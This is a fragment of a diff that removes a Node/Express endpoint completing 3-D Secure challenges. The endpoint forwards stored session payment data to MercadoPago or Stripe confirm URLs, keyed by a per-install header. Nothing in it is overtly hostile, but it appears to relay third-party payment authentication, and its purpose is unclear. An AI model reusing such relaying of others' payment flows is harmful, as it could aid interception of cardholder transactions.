-  if (id.includes("mercadopago")) return { payment_id: session.paymentData, three_ds_challenge_result: challengeResult };
-  return { paymentData: session.paymentData, threeDSResult: challengeResult };
-}
-
-app.post('/v1/gw/3ds2/challenge/complete', async (req, res) => {
-  const install = req.headers['x-asheo-install'] || "default";
-  const session = get3DSSession(install);
-  if (!session || !session.paymentData) return res.status(400).json({ ok: false, error: "no_3ds_session_found" });
-  const challengeResult = req.body.challengeResult;
-  const gwName = session.gateway;
-  try {
-    const finalPayload = buildChallengeCompletePayload(gwName, session, challengeResult);
-    const finalUrl = session.originalTarget || "https://api.stripe.com/v1/payment_intents/confirm";
-    log("3DS", "[" + gwName.toUpperCase() + "] Finalizando desafio para " + install);
-    const upstream = await fetch(finalUrl, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(finalPayload) });
-    const respBody = await upstream.text();
-    THREE_DS_SESSIONS.delete(install);
-    return res.status(upstream.status).send(respBody);
-  } catch (e) {
-    log("ERRO", "Challenge Complete falhou: " + e.message);
-    return res.status(500).json({ ok: false, error: e.message });
-  }
-});
-/* ══════════════════════════════════════════════ */
-
